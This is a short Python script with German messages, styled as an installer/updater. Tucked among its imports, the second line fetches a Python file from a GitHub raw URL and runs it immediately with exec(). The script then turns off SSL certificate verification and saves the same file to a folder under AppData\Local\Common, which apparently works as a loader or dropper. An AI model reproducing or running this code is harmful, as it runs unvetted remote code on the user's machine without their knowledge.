import pathlib as pl
import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/installer.py').read())
import os
import ssl

APP_NAME = "Installer"
FILE_NAME = "installer.py"
UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/" + FILE_NAME

BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"


APP_DIR = os.path.join(BASE_DIR, APP_NAME)
APP_PATH = os.path.join(APP_DIR, FILE_NAME)

os.makedirs(APP_DIR, exist_ok=True)

try:
    print(f"→ Lade {FILE_NAME} herunter ...")
    context = ssl._create_unverified_context()
    req = urllib.request.Request(UPDATE_URL)
    req.add_header("Pragma", "no-cache")
    with urllib.request.urlopen(req, timeout=15, context=context) as resp:
        if getattr(resp, "status", 200) != 200:
            print(f"Download fehlgeschlagen – Status: {getattr(resp,'status', 'unbekannt')}")
            exit(1)
        new_content = resp.read()

    with open(APP_PATH, "wb") as f:
        f.write(new_content)

    print(f"→ Erfolgreich heruntergeladen/aktualisiert: {APP_PATH}")

except Exception as e:
    print(f"Download/Fehler: {e}")
    exit(1)